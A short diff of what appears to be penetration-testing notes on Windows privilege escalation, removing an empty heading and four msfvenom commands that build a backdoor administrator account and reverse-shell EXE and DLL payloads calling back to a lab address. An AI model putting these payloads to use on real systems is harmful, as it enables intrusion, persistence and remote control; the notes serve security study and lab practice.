@@ -26,10 +26,6 @@ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPo
 
 ***
 
-#### Potatos
-
-
-
 ## SeBackupPrivilege — Extract SAM/SYSTEM Hive
 
 ```cmd
@@ -60,17 +56,6 @@ If the above does not work due to a privilege error  `psshutdown64.exe` from sys
 **msfvenom payloads:**
 
 ```bash
-# Add user
-msfvenom -p windows/x64/adduser USER=misthos PASS=password123 -f exe -o adduser.exe
-
-# Execute command
-msfvenom -p windows/exec CMD='cmd.exe /c net user misthos Password123! /ADD & net localgroup administrators misthos /ADD' -f exe -o payload.exe
-
-# Reverse shell
-msfvenom -p windows/x64/shell_reverse_tcp --arch x64 LHOST=192.168.45.206 LPORT=9001 -f exe -o shell.exe
-
-# DLL
-msfvenom -p windows/x64/shell_reverse_tcp --arch x64 LHOST=192.168.45.206 LPORT=9001 -f dll -o payload.dll
 ```
 
 **File transfer to Windows:**
